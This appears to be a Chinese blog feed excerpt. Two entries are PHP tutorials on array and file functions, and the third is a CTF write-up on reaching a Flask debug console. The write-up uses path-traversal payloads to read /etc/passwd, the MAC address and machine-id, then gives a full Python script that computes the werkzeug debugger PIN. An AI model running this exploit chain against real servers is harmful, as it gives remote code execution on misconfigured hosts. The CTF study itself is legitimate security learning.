所有的变量名都会被赋予一个前缀。</li><li><em>EXTR_PREFIX_INVALID</em> - 只有无效或数字变量名称才会被赋予前缀。</li><li><em>EXTR_IF_EXISTS</em> - 只覆盖当前符号表中的现有变量，否则什么都不做。</li><li><em>EXTR_PREFIX_IF_EXISTS</em> - 如果当前符号表中存在相同的变量，则只向变量添加前缀。</li><li><em>EXTR_REFS</em> - 提取变量作为参考。导入的变量仍然引用数组参数的值</li></ul><p>&#x2F;&#x2F;更多请阅读：<a href="https://www.yiibai.com/php/php_function_extract.html">https://www.yiibai.com/php/php_function_extract.html</a> </p></blockquote><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/57672472_p0.jpg" alt="57672472_p0"></p>]]></content>
    
    
    <summary type="html">这一章介绍了PHP的一些处理数组的有用函数，只节选了一部分，要阅读全部函数请翻阅PHP的在线手册。</summary>
    
    
    
    <category term="PHP学习" scheme="http://example.com/categories/PHP%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP碎碎念（二）——文件读取基础</title>
    <link href="http://example.com/2023/11/08/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/11/08/PHP%E5%AD%A6%E4%B9%A0/PHP%E7%A2%8E%E7%A2%8E%E5%BF%B5%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/</id>
    <published>2023-11-07T16:27:39.000Z</published>
    <updated>2023-11-07T16:30:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>距离上一次更新PHP又过了很久……太多东西要学了。这次更新主要是因为遇到了新的需求，要用PHP开发一个平台后端，不得不再捡起来……</p><p>总之，继续启动！</p><hr><p>这章我们主要粗略的过一遍PHP的数据储存和读取，节奏会比较快。之所以快马加鞭，是因为PHP的精髓不在这里。本章只涉及最基本的读取文件操作，大部分和C语言类似，而且目前储存数据更常用的是采取DBMS数据库来管理数据储存。所以本章只做简单的归纳，快速掌握就行。</p><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>PHP的处理文件方式和C语言大致相同，都分为三步：</p><ol><li>打开文件。如果文件不存在就创建（写模式）或者报错&#x2F;退出（读模式）</li><li>从文件中读取&#x2F;写入数据</li><li>关闭文件</li></ol><p>接下来我们先从打开文件开始介绍，主要讲解一下函数。</p><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>在PHP中打开文件，一般使用fopen()函数。除了传递需要打开的文件名外，还需要指定文件模式。</p><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h3><p>上文中提到的文件模式，主要有三点需要注意：</p><ol><li>只读&#x2F;只写或者读&#x2F;写</li><li>如果选择写模式，是覆盖原内容还是追加</li><li>可以使用二进制模式处理文件</li></ol><p>fopen支持上述三种模式，使用方法为<code>fopen(file_path,file_mode,[include_path,protocol])</code>。文件路径和文件模式是必选的，使用方法和C相同。主要参数如下，b表示二进制读&#x2F;写。</p><ul><li>r，rb读文件</li><li>w，wb写文件</li><li>a，ab追加写文件</li></ul><p>后两者是可选的，include_path是一个布尔值，PHP根据它判断是否要搜索include_path，这个值在PHP的配置中设置；后者则是协议前缀，比如<code>http://</code>。</p><h4 id="通过FTP或者HTTP打开文件"><a href="#通过FTP或者HTTP打开文件" class="headerlink" title="通过FTP或者HTTP打开文件"></a>通过FTP或者HTTP打开文件</h4><p>除了打开一个本地文件进行操作外，fopen()函数还支持通过FTP、HTTP等协议打开其他文件，这点可以在php.ini文件中设置。如果文件名以<code>http://</code>开头，则fopen()函数将建立一个到指定服务器的连接，并返回一个指向HTTP响应的指针。FTP情况同理。</p><h4 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h4><p>调用fopen()函数时可能会产生各种错误，比如权限不够无法读取文件，或者文件不存在。可以在调用fopen()函数前加上<code>@</code>错误抑制符来阻止PHP报错并用if语句来设置一个对用户更友好的自定义报错信息。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;order.txt&quot;</span>,<span class="string">&quot;ab&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>向函数传递<strong>文件名</strong>，这个函数会把文件中所有的内容读取并输出至标准输出（浏览器）上，然后再关闭这个文件。</p><h3 id="fpassthru"><a href="#fpassthru" class="headerlink" title="fpassthru()"></a>fpassthru()</h3><p>像这个函数传递<strong>文件指针</strong>，其余作用和readfile()函数相同。</p><h3 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h3><p>file()函数和readfile()函数用法和效果相同，除此之外它还会把读取到的文件数据作为返回值发送到一个数组里。其中每一行都对应数组的一个元素。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>作用与readfile()函数相同，但是这个函数不会把文件内容回显到浏览器上，而是以字符串的形式返回。</p><h3 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h3><p>向函数传递一个文件指针和一个长度，函数将读取指定长度或者网络数据包结束前的部分。</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>在PHP中有很多写入文件的函数，下面一一列举。</p><h3 id="fwrite-fputs"><a href="#fwrite-fputs" class="headerlink" title="fwrite()&#x2F;fputs()"></a>fwrite()&#x2F;fputs()</h3><p>fwrite的使用方法为<code>fwrite($fp,$outputstring);</code>，要求传入一个文件指针并将保存在<code>$outputstring</code>的字符串写入文件。fputs()是fwrite()函数的别名。</p><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h3><p>该函数原型如下所示。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">string</span> filename,</span><br><span class="line"><span class="keyword">string</span> data</span><br><span class="line">[,<span class="keyword">int</span> flags</span><br><span class="line">[,resource context]])</span><br></pre></td></tr></table></figure><p>它不需要使用fopen函数打开文件就可以将包含在data中的字符串写入到文件中。与之相匹配的函数是file_get_contents()。</p><h3 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h3><p>传入一个文件指针，每次读入<strong>一行</strong>，直到读取到换行符<code>\n</code>或者文件结束符<code>EOF</code>结束。</p><h3 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss()"></a>fgetss()</h3><p>fgets()函数的变体，更加安全。它会把读取到的文件中所有的PHP和HTML标记符过滤。这样可以防止自己的HTML代码被破坏格式，或者读取到恶意的PHP代码。</p><h3 id="fgetcsv"><a href="#fgetcsv" class="headerlink" title="fgetcsv()"></a>fgetcsv()</h3><p>fgets()函数的另一个变体，向函数传入文件指针，读取长度和分隔符。函数会在读取到分隔符时自动换行，分隔符可以是制表符<code>\t</code>，空格等。如果不希望限制读取长度，可以将此参数设置为0。</p><h3 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc()"></a>fgetc()</h3><p>传入一个文件指针，一次读取一个<strong>字符</strong>。</p><h2 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h2><p>之所以引入这个概念，是因为PHP会遇到与C语言中不一样的情况。假如在一个订单系统中有两位用户同时下单了最后一个商品，如果没有文件锁定就会导致紊乱。所以引入flock()函数，在一个用户打开文件进行操作时，其他用户无法对该文件进行操作。</p><h3 id="flock"><a href="#flock" class="headerlink" title="flock()"></a>flock()</h3><p>在任何一个文件被打开且在进行读写前，应该使用这个函数进行锁定。函数原型如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">flock</span>(resource fp,<span class="keyword">int</span> operation[,<span class="keyword">int</span>＆wouldblock])</span><br></pre></td></tr></table></figure><p>除了传入文件指针外，一样的要指定锁定模式。第三个参数是可选的，如果文件锁定导致进程堵塞，那么第三个参数的值将为true。</p><p>其中锁定模式总结如下。</p><table><thead><tr><th>操作值</th><th>意义</th></tr></thead><tbody><tr><td>LOCK_SH</td><td>读操作锁定。意味着文件可以共享，其他人可以读文件</td></tr><tr><td>LOCK_EX</td><td>写操作锁定。代表互斥，文件不能共享</td></tr><tr><td>LOCK_UN</td><td>释放锁定</td></tr><tr><td>LOCK_NB</td><td>防止在请求加锁时发生阻塞（Windows系统不支持）（我也不知道这是什么鬼）</td></tr></tbody></table><p>如果要使用flock()函数，就必须将其添加到所有使用文件的脚本中，否则没有意义。</p><p>使用flock()函数后，代码更加健壮，但是还不够好。因为加锁时仍然会产生竞争条件，这时候我们就需要DBMS数据库管理系统来帮助我们解决这个问题，后面再慢慢讲。</p><h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a>fclose()</h3><p>和C语言相同，向其传入一个文件指针，关闭成功返回true，否则返回false。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="feof"><a href="#feof" class="headerlink" title="feof()"></a>feof()</h3><p>判断一个文件是否读到文件结尾。</p><h3 id="file-exist"><a href="#file-exist" class="headerlink" title="file_exist()"></a>file_exist()</h3><p>判断一个文件是否存在。</p><h3 id="filesize"><a href="#filesize" class="headerlink" title="filesize()"></a>filesize()</h3><p>查看一个文件的大小，单位为字节。</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h3><p>删除一个文件。</p><h3 id="rewind-、fseek-、ftell"><a href="#rewind-、fseek-、ftell" class="headerlink" title="rewind()、fseek()、ftell()"></a>rewind()、fseek()、ftell()</h3><p>用于在文件中定位，用法和C语言相同，不多赘述（无论是PHP还是C语言用的都极少）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300483.jpg" alt="300483"></p>]]></content>
    
    
    <summary type="html">基础的PHP文件处理，和C语言类似。粗略的了解一下即可，真正主流的数据库处理后面再讲。</summary>
    
    
    
    <category term="PHP学习" scheme="http://example.com/categories/PHP%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>一文弄清楚Flask框架下该如何计算PIN码</title>
    <link href="http://example.com/2023/11/06/%E4%B8%80%E6%96%87%E5%BC%84%E6%B8%85%E6%A5%9AFlask%E6%A1%86%E6%9E%B6%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97PIN%E7%A0%81/"/>
    <id>http://example.com/2023/11/06/%E4%B8%80%E6%96%87%E5%BC%84%E6%B8%85%E6%A5%9AFlask%E6%A1%86%E6%9E%B6%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97PIN%E7%A0%81/</id>
    <published>2023-11-06T09:26:53.000Z</published>
    <updated>2023-11-06T09:30:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>事情的起因是XSCTF决赛的一道题。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140751987.png" alt="image-20231106140751987"></p><p>进入链接，查看题目。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140832584.png" alt="image-20231106140832584"></p><p>到这里提示已经很明显了，Flask和debugger（调试模式）。在开发Flask应用中，如果开发人员忘记关闭调试模式，就可能会导致严重的安全隐患。</p><p>随便传递一个错误的参数，就可以看到页面报错的调试页面。点击红圈处，可以直观地观察到源码泄露。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141318438.png" alt="image-20231106141318438"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141334777.png" alt="image-20231106141334777"></p><p>容易分析代码逻辑，这段Python代码将<code>filepath</code>和<code>textfile</code>拼合成一个文件路径并打开，读取该文件路径的内容。其中<code>filepath</code>的值为<code>./uploads/</code>,<code>textfile</code>参数可控。此时我们马上能想到目录穿越漏洞，导致文件任意读取。</p><p>构造payload为<code>?file=../../../../etc/passwd</code>，成功读取到敏感文件<code>/etc/passwd</code>，内含登录系统的用户信息。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106142312396.png" alt="image-20231106142312396"></p><p>关于<code>/etc/passwd</code>文件更详细的解释可以参考这篇博客<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">非常详细的&#x2F;etc&#x2F;passwd解释_etc&#x2F;passwd文件的内容和含义-CSDN博客</a>。</p><p>总之经过以上操作，我们成功验证了题目存在文件任意读漏洞，并且有了初步的思路：通过文件任意读读取敏感信息，计算出Flask控制台的PIN码从而获得开发者权限查看flag文件。</p><p>现在开始细聊如何计算PIN码。</p><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>在计算PIN码之前，有一件事必须知道，Flask的PIN码计算仅和werkzeug的debug模块有关。</p><p><font color=red size=5><strong>和Python版本无关！！！</strong></font></p><p>在网络上大多数博客都会告诉你，Flask框架计算PIN码时在Python版本3.6时采用md5加密，在Python版本3.8开始使用sha1加密。但是实际上并没有Python版本为3.7就不能采用sha1加密的说法，仅与werkzeug的版本有关系。而现在绝大多数都是采用高版本的加密，也就是sha1。这一点极其重要，将直接影响我们后续用于计算PIN码时采用的脚本。</p><h3 id="什么是PIN码"><a href="#什么是PIN码" class="headerlink" title="什么是PIN码"></a>什么是PIN码</h3><p>pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell。</p><h3 id="PIN码如何生成"><a href="#PIN码如何生成" class="headerlink" title="PIN码如何生成"></a>PIN码如何生成</h3><p>pin码生成要六要素<br>1.username 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测<br>2.modname 默认flask.app<br>3.appname 默认Flask<br>4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量<br>5.uuidnode mac地址的十进制,任意文件读 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了</p><p>了解到这些之后，就可以正式开启算PIN了。</p><h2 id="获取username"><a href="#获取username" class="headerlink" title="获取username"></a>获取username</h2><p>username参数指的是当前运行这个程序的用户名。这个比较好做，在文件任意读时读取<code> /etc/passwd</code>，猜测用户名就好。比如这道题的最下方出现了<code>xsctf</code>，我们猜测这就是用户名。有一些题目下可能没有特别特殊的用户名，这时候我们就只好猜测用户名为最上方的<code>root</code>。也就是说运行程序的是拥有root权限的管理员。</p><h2 id="获取modname"><a href="#获取modname" class="headerlink" title="获取modname"></a>获取modname</h2><p>一般来说这个值都是默认为<code>flask.app</code>，具体的获取方式每个版本都不同，比如可以通过<code>getattr(app, &quot;module&quot;, t.cast(object, app).class.module)</code>来获取modname。</p><h2 id="获取appname"><a href="#获取appname" class="headerlink" title="获取appname"></a>获取appname</h2><p>一般来说这个值也是默认为<code>Flask</code>，也可以通过<code>getattr(app, &#39;name&#39;, app.class.name)</code>方式获取。</p><h2 id="获取moddir"><a href="#获取moddir" class="headerlink" title="获取moddir"></a>获取moddir</h2><p>moddir是flask所在的路径，可以通过<code>getattr(mod, &#39;file&#39;, None)</code>来获得，题目中一般通过查看debug的报错信息获得，如下图。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145402374.png" alt="image-20231106145402374"></p><p>故本题中的路径为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>。其实一般都是这个值，最多python版本可能会有差异。</p><h2 id="获取uuidnode"><a href="#获取uuidnode" class="headerlink" title="获取uuidnode"></a>获取uuidnode</h2><p>网卡的mac地址的十进制，可以通过代码uuid.getnode()获得，也可以通过读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得，一般获取的是一串十六进制数，将其中的横杠去掉然后转十进制就行。</p><p>本题构造payload为<code>?file=../../../../sys/class/net/eth0/address</code>，结果如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145741537.png" alt="image-20231106145741537"></p><p>例：02:42:ac:1e:00:02 &#x3D;&gt; 2485378744322<br>也可以直接跑print(int(“02:42:ac:1e:00:02”.replace(“:”,””),16))</p><h2 id="获取machine-id"><a href="#获取machine-id" class="headerlink" title="获取machine_id"></a>获取machine_id</h2><p>这里尤为重要。</p><p>如果我们能够实现文件任意读，就读取<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>（注意python版本，可以通过上面的报错信息拿到），找到里面的<code>get_machine_id</code>方法，可以最直观的看到本题目计算Flask的machine_id的过程。</p><p>构造payload<code>?file=../../../../usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>，找到该方法。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106150726655.png" alt="image-20231106150726655"></p><p>重点关注这一段代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">    <span class="comment">#依次打开&quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;两个文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span><span class="comment">#注意这个break，只要满足一个就退出循环</span></span><br><span class="line">                <span class="comment">#这里因为&quot;/etc/machine-id&quot;在前，所以优先级更高</span></span><br><span class="line">--snip--</span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#这里主要是针对docker机的，通过读取&quot;/proc/self/cgroup&quot;获取经过正则后的值，然后拼接在上一步的字符上</span></span><br><span class="line">        <span class="comment">#不同的题目环境正则条件也许不一样</span></span><br><span class="line">        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> OSError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里很清楚的描述了machine_id码是如何计算的，值得一提的是每个题目的machine_id值计算也许会不一样，所以能读取该环境的<code>get_machine_id</code>函数是最好的方法。</p><p>这里再贴一段别的大佬博客中的解释。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. /etc/machine-id（一般仅非docker机有，截取全文）</span><br><span class="line">2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span><br><span class="line">3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span><br><span class="line"><span class="comment"># 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line">文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span><br><span class="line">文件3如果存在的话就截取，不存在的话就不用管</span><br><span class="line">最后machine-id=（文件1或文件2）+文件3（存在的话）</span><br></pre></td></tr></table></figure><p>重点是**<code>最后machine-id=（文件1或文件2）+文件3（存在的话）</code>**这段话。machine-id和boot-id只需取一个，machine的优先级更高，然后再与cgroup文件的内容拼接作为最终的machine-id值。值得一提的是cgroup的截取方法并不一定是仅截取最后一个斜杠的内容，根据题目正则条件的不同也有可能只取<code>/docker/</code>后的部分。</p><p>这里的XSCTF题目中machine-id和boot-id都有值，而cgroup文件为空，故只需要取machine-id文件的内容作为machine-id的值。构造payload为<code>?file=../../../../etc/machine-id</code>，读取machine-id为<code>6e1d32ebf38c587c4a41089c0c744c83</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106152333132.png" alt="image-20231106152333132"></p><p>至此集齐了计算PIN码的所有条件。</p><h2 id="计算PIN-获得flag"><a href="#计算PIN-获得flag" class="headerlink" title="计算PIN&amp;获得flag"></a>计算PIN&amp;获得flag</h2><p>下面给出脚本，为了避免werkzeug版本产生的歧义，脚本能够同时给出经过md5和sha1加密计算得到的PIN码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMd5Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSha1Pin</span>(<span class="params">probably_public_bits, private_bits</span>):</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">macToInt</span>(<span class="params">mac</span>):</span><br><span class="line">    mac = mac.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(mac, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = argparse.ArgumentParser(description = <span class="string">&quot;Calculate Python Flask Pin&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>,required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;运行flask用户的用户名&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--modname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;flask.app&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为flask.app&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--appname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;Flask&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为Flask&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;getattr(mod, &#x27;__file__&#x27;, None):flask包中app.py的路径&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-M&#x27;</span>, <span class="string">&#x27;--MAC&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;MAC地址&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--machineId&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;机器ID&quot;</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        args.username,</span><br><span class="line">        args.modname,</span><br><span class="line">        args.appname,</span><br><span class="line">        args.path</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        macToInt(args.MAC),</span><br><span class="line">        <span class="built_in">bytes</span>(args.machineId, encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">    md5Pin = getMd5Pin(probably_public_bits, private_bits)</span><br><span class="line">    sha1Pin = getSha1Pin(probably_public_bits, private_bits)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Md5Pin:  &quot;</span> + md5Pin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sha1Pin:  &quot;</span> + sha1Pin)</span><br></pre></td></tr></table></figure><p>向终端传入参数。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python 计算PIN_2.py -u xsctf -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 02:42:ac:1e:00:02 -i 6e1d32ebf38c587c4a41089c0c744c83</span><br></pre></td></tr></table></figure><p>计算结果如下，其中sha1的计算结果为：890-921-121</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106153806563.png" 